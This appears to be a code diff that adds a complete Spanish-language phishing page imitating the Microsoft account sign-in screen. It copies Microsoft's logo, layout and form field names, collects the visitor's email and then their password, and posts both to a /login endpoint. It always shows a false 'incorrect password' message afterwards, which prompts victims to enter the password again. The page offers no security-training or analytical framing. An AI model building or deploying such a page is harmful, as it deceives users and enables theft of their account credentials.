@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Iniciar sesión en tu cuenta Microsoft</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column}
+.header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:10px}
+.ms-logo{display:flex;gap:2px;flex-wrap:wrap;width:21px;height:21px}
+.ms-logo span{width:10px;height:10px}
+.ms-name{font-size:18px;color:#262626;letter-spacing:-.3px}
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
+.card{background:#fff;border-radius:0;padding:44px 44px 36px;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+.card h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px}
+.card p.sub{font-size:15px;color:#1b1b1b;margin-bottom:24px}
+.field{margin-bottom:4px}
+.field label{display:block;font-size:13px;color:#1b1b1b;font-weight:600;margin-bottom:4px}
+.field input{width:100%;padding:6px 10px;border:1px solid #666;border-radius:0;font-size:15px;outline:none;height:36px;color:#1b1b1b}
+.field input:focus{border-color:#0067b8;border-width:2px;outline:none}
+.hint{font-size:11px;color:#666;margin-bottom:20px;margin-top:4px}
+.options{display:flex;align-items:center;margin-bottom:20px}
+.options a{color:#0067b8;font-size:13px;text-decoration:none;margin-right:auto}
+.options a:hover{text-decoration:underline}
+.btn{background:#0067b8;color:#fff;border:none;padding:0 20px;height:36px;font-size:15px;cursor:pointer;margin-left:auto;display:block}
+.btn:hover{background:#005ea2}
+.btn-row{display:flex;justify-content:flex-end;margin-top:8px}
+.error{background:#fde7e9;border-left:3px solid #c50f1f;padding:10px 12px;font-size:13px;color:#c50f1f;margin-bottom:14px;display:none}
+.footer{text-align:center;padding:16px;font-size:12px;color:#717171}
+.footer a{color:#0067b8;text-decoration:none;margin:0 8px}
+#step2{display:none}
+.user-row{border:1px solid #8a8a8a;padding:6px 10px;display:flex;align-items:center;gap:10px;margin-bottom:20px;font-size:13px;cursor:pointer}
+.user-row:hover{background:#f2f2f2}
+.avatar{width:32px;height:32px;border-radius:50%;background:#0067b8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600;flex-shrink:0}
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="ms-logo">
+    <span style="background:#f25022"></span>
+    <span style="background:#7fba00"></span>
+    <span style="background:#00a4ef"></span>
+    <span style="background:#ffb900"></span>
+  </div>
+  <span class="ms-name">Microsoft</span>
+</div>
+
+<div class="main">
+  <div class="card">
+
+    <!-- Step 1: Email -->
+    <div id="step1">
+      <h1>Iniciar sesión</h1>
+      <div class="error" id="error1">No se encontró ninguna cuenta con ese correo electrónico. Inténtalo de nuevo con una dirección de correo distinta.</div>
+      <div class="field">
+        <label for="email">Correo electrónico, teléfono o Skype</label>
+        <input type="text" id="email" name="loginfmt" placeholder="" autocomplete="email" required>
+      </div>
+      <div class="hint">¿No tienes cuenta? <a href="#" style="color:#0067b8;text-decoration:none">Crea una.</a></div>
+      <div class="options">
+        <a href="#">¿No puedes acceder a tu cuenta?</a>
+      </div>
+      <div class="btn-row">
+        <button class="btn" onclick="goStep2(event)">Siguiente</button>
+      </div>
+    </div>
+
+    <!-- Step 2: Password -->
+    <div id="step2">
+      <div class="user-row" onclick="goBack()">
+        <div class="avatar" id="avatar">?</div>
+        <div>
+          <div id="email-display" style="font-weight:600;font-size:13px"></div>
+          <div style="font-size:11px;color:#717171">Cuenta Microsoft</div>
+        </div>
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#0067b8" style="margin-left:auto"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+      <h1>Escribir contraseña</h1>
+      <div class="error" id="error2">La contraseña es incorrecta. Inténtalo de nuevo.</div>
+      <div class="field">
+        <label for="password">Contraseña</label>
+        <input type="password" id="password" name="passwd" placeholder="" autocomplete="current-password" required>
+      </div>
+      <div class="options">
+        <a href="#">Olvidé mi contraseña</a>
+      </div>
+      <div class="btn-row">
+        <button class="btn" onclick="doLogin(event)">Iniciar sesión</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">Condiciones de uso</a>
+  <a href="#">Privacidad y cookies</a>
+  <a href="#">...</a>
+</div>
+
+<script>
+function goStep2(e){
+  e.preventDefault();
+  var em=document.getElementById('email').value.trim();
+  if(!em)return;
+  document.getElementById('step1').style.display='none';
+  document.getElementById('step2').style.display='block';
+  document.getElementById('email-display').textContent=em;
+  document.getElementById('avatar').textContent=em[0].toUpperCase();
+  document.getElementById('password').focus();
+}
+function goBack(){
+  document.getElementById('step1').style.display='block';
+  document.getElementById('step2').style.display='none';
+}
+function doLogin(e){
+  e.preventDefault();
+  var em=document.getElementById('email').value;
+  var pw=document.getElementById('password').value;
+  if(!pw)return;
+  fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'loginfmt='+encodeURIComponent(em)+'&passwd='+encodeURIComponent(pw)})
+  .then(function(){
+    document.getElementById('error2').style.display='block';
+    document.getElementById('password').value='';
+    document.getElementById('password').focus();
+  }).catch(function(){
+    document.getElementById('error2').style.display='block';
+  });
+}
+</script>
+</body>
+</html>
